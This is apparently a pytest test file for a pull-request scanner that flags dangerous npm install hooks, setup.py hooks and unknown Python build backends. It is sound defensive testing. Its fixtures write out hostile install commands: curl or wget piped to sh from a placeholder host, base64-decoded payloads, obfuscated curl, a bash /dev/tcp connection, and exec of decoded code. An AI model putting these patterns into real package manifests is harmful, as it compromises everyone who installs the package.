import pytest

from pr_scanner.models import ChangedFile, Diff, Severity
from pr_scanner.rules import default_registry
from pr_scanner.rules.hooks import NpmLifecycleHook, PyBuildBackend, PySetupHook


def file(path, *lines, status="modified"):
    return ChangedFile(path=path, status=status, added_lines=tuple(enumerate(lines, 1)))


def diff(*files):
    return Diff(head_sha="a" * 40, base_sha="b" * 40, files=tuple(files))


def run(rule, *files):
    return list(rule.evaluate(diff(*files)))


def pkg(*lines, path="package.json"):
    return run(NpmLifecycleHook(), file(path, *lines))


# ---------------------------------------------------------------- npm hooks


def test_postinstall_pipe_to_shell_is_critical():
    (f,) = pkg('  "postinstall": "curl -s https://example.invalid/x.sh | sh"')
    assert f.rule_id == "HOOK-NPM"
    assert f.severity == Severity.CRITICAL
    assert f.file == "package.json" and f.line == 1
    assert "example.invalid" in f.evidence
    assert f.rationale and f.remediation


def test_hook_on_a_single_minified_line():
    (f,) = pkg('{"name":"x","scripts":{"postinstall":"wget -qO- https://example.invalid/p | bash"}}')
    assert f.severity == Severity.CRITICAL


def test_unicode_escaped_key_is_still_detected():
    # JSON allows "postinstall" == "postinstall"
    (f,) = pkg('"post\\u0069nstall": "curl https://example.invalid/x | sh"')
    assert f.severity == Severity.CRITICAL


@pytest.mark.parametrize(
    "cmd",
    [
        'c\\"\\"url https://example.invalid/x | sh',  # c""url
        "cu\\\\rl https://example.invalid/x | sh",  # cu\rl
        "curl${IFS}https://example.invalid/x|sh",
        "echo Y3VybA== | base64 -d | sh",
        "node -e \\\"require('child_process').exec('id')\\\"",
        "python3 -c 'import os'",
        "powershell -enc AAAA",
        "bash -c 'exec 3<>/dev/tcp/203.0.113.9/80'",
    ],
)
def test_obfuscated_or_inline_payloads_are_critical(cmd):
    (f,) = pkg(f'"preinstall": "{cmd}"')
    assert f.severity == Severity.CRITICAL


@pytest.mark.parametrize(
    "line",
    [
        '"prepare": "husky install"',
        '"install": "node-gyp rebuild"',
        '"postinstall": "patch-package"',
        '"prepare": "npm run build"',
        '"prepare": "tsc -p ."',
        '"install": "prebuild-install || node-gyp rebuild"',
    ],
)
def test_common_benign_hooks_are_not_reported(line):
    assert pkg(line) == []


def test_allowlist_must_match_whole_command():
    (f,) = pkg('"postinstall": "node-gyp rebuild && curl https://example.invalid/x | sh"')
    assert f.severity == Severity.CRITICAL


def test_unknown_install_time_hook_is_medium():
    (f,) = pkg('"postinstall": "node build.js"')
    assert f.severity == Severity.MEDIUM


def test_unknown_prepare_hook_is_low():
    (f,) = pkg('"prepare": "make bootstrap"')
    assert f.severity == Severity.LOW


def test_hook_running_a_script_added_in_the_same_pr_is_high():
    d = diff(
        file("package.json", '"postinstall": "node scripts/setup.js"'),
        file("scripts/setup.js", "console.log(1)", status="added"),
    )
    (f,) = NpmLifecycleHook().evaluate(d)
    assert f.severity == Severity.HIGH
    assert "scripts/setup.js" in f.rationale


def test_script_path_is_resolved_relative_to_the_package():
    d = diff(
        file("pkg/package.json", '"postinstall": "node ./scripts/x.js"'),
        file("pkg/scripts/x.js", "1", status="added"),
    )
    (f,) = NpmLifecycleHook().evaluate(d)
    assert f.severity == Severity.HIGH


def test_script_unchanged_in_this_pr_stays_medium():
    d = diff(
        file("package.json", '"postinstall": "node scripts/setup.js"'),
        file("scripts/other.js", "1", status="added"),
    )
    (f,) = NpmLifecycleHook().evaluate(d)
    assert f.severity == Severity.MEDIUM


def test_non_lifecycle_scripts_are_ignored():
    assert pkg('"test": "curl http://localhost:3000/health"', '"lint": "eslint ."') == []


def test_dependency_named_install_is_not_a_hook():
    assert pkg('"install": "^1.2.3"', '"postinstall": "~2.0"') == []


def test_semver_lookalike_with_a_command_is_not_skipped():
    (f,) = pkg('"install": "1.0.0 || curl https://example.invalid/x | sh"')
    assert f.severity == Severity.CRITICAL


def test_only_package_json_is_inspected():
    assert run(NpmLifecycleHook(), file("config.json", '"postinstall": "curl x | sh"')) == []
    assert run(NpmLifecycleHook(), file("package.json", '"postinstall": "curl x | sh"', status="removed")) == []


def test_multiple_hooks_yield_multiple_findings_with_correct_lines():
    fs = pkg('"preinstall": "node a.js"', '"name": "x"', '"postinstall": "curl https://example.invalid | sh"')
    assert sorted((f.line, f.severity) for f in fs) == [(1, Severity.MEDIUM), (3, Severity.CRITICAL)]


# ----------------------------------------------------------- python setup.py


def setup(*lines):
    return run(PySetupHook(), file("setup.py", *lines))


def test_cmdclass_override_is_high():
    (f,) = setup("    cmdclass={'install': PostInstall},")
    assert f.rule_id == "HOOK-PYSETUP" and f.severity == Severity.HIGH


def test_subclassing_install_command_is_high():
    (f,) = setup("class PostInstall(install):")
    assert f.severity == Severity.HIGH


def test_network_access_in_setup_is_critical():
    (f,) = setup("    urllib.request.urlopen('https://example.invalid/x').read()")
    assert f.severity == Severity.CRITICAL


def test_decode_and_exec_in_setup_is_critical():
    (f,) = setup("exec(base64.b64decode('AAAA'))")
    assert f.severity == Severity.CRITICAL


def test_subprocess_in_setup_is_medium():
    (f,) = setup("v = subprocess.check_output(['git', 'describe'])")
    assert f.severity == Severity.MEDIUM


def test_exec_of_version_file_is_medium_not_critical():
    (f,) = setup("exec(open('pkg/_version.py').read())")
    assert f.severity == Severity.MEDIUM


def test_re_compile_is_not_exec():
    assert setup("PAT = re.compile('x')") == []


def test_only_setup_py_is_inspected():
    assert run(PySetupHook(), file("tools/helper.py", "os.system('id')")) == []


# --------------------------------------------------------- pyproject backends


def backend(*lines):
    return run(PyBuildBackend(), file("pyproject.toml", *lines))


@pytest.mark.parametrize(
    "line",
    [
        'build-backend = "setuptools.build_meta"',
        "build-backend = 'hatchling.build'",
        'build-backend = "poetry.core.masonry.api"',
        'build-backend = "flit_core.buildapi"',
        'build-backend = "maturin"',
    ],
)
def test_known_backends_are_fine(line):
    assert backend(line) == []


@pytest.mark.parametrize(
    "line",
    ['build-backend = "evil_pkg.build"', "build-backend = 'setuptoolz.build_meta'", '"build-backend" = "x"'],
)
def test_unknown_backend_is_high(line):
    (f,) = backend(line)
    assert f.rule_id == "HOOK-PYBACKEND" and f.severity == Severity.HIGH


def test_in_tree_backend_path_is_high():
    (f,) = backend('backend-path = ["_build"]')
    assert f.severity == Severity.HIGH


def test_only_pyproject_is_inspected():
    assert run(PyBuildBackend(), file("other.toml", 'build-backend = "evil"')) == []


# ------------------------------------------------------------------ registry


def test_default_registry_contains_hook_rules_with_unique_ids():
    ids = [r.id for r in default_registry().rules()]
    assert {"HOOK-NPM", "HOOK-PYSETUP", "HOOK-PYBACKEND"} <= set(ids)
    assert len(ids) == len(set(ids))
